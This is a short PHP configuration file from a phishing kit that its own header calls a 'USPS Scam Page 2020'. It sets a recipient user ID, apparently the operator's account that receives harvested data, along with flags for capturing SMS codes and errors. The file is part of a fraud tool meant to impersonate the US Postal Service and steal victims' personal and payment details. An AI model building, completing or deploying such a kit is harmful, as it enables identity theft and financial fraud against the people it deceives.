<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
$user_ids=array("805444648");
$sms='1';
$error='1';
?>
